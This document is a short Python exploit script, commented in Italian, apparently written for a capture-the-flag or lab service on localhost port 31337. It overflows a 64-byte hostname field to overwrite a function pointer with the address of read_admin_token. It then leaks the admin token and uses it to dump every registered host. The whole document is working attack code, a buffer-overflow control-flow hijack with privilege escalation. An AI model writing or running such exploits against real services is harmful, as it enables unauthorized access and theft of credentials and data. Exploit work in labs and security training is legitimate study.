#!/usr/bin/env python3
import socket, struct

HOST, PORT = "127.0.0.1", 31337
ADDR = 0x4040a7                      # indirizzo di read_admin_token (letto con nm)

def recv_all(s, t=0.5):              # legge la risposta del server
    s.settimeout(t)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
    except socket.timeout:
        pass
    return data

s = socket.socket()
s.connect((HOST, PORT))

# 1) REGISTER: creo l'host "A" e ottengo il suo token
s.sendall(b"REGISTER 1\n")           # "sto per mandarti 1 byte di hostname"
s.sendall(b"A")                      # l'hostname (1 byte)
resp = recv_all(s)
print("REGISTER ->", resp)
token = resp.split()[1].decode()     # dalla risposta "TOKEN xxxx" prendo xxxx

# 2) EDIT: overflow di name (64 byte) + sovrascrivo print_fn (8 byte)
payload = b"A" + b"\x00"*63 + struct.pack("<Q", ADDR)   # 72 byte totali
s.sendall(f"EDIT A {token} {len(payload)}\n".encode())  # la riga di comando
s.sendall(payload)                                      # i 72 byte grezzi
print("EDIT ->", recv_all(s))

# 3) VIEW: fa scattare read_admin_token -> il server mi rimanda l'admin token
s.sendall(f"VIEW A {token}\n".encode())
view = recv_all(s)
print("VIEW ->", view)
admin = view.split(b"VIEWOK")[0].strip().decode()       # estraggo l'admintoken
print("ADMIN TOKEN:", admin)

# 4) DUMP: con l'admin token ottengo la lista di TUTTI gli host
s.sendall(f"DUMP {admin}\n".encode())
print("DUMP ->\n" + recv_all(s).decode(errors="replace"))
s.close()
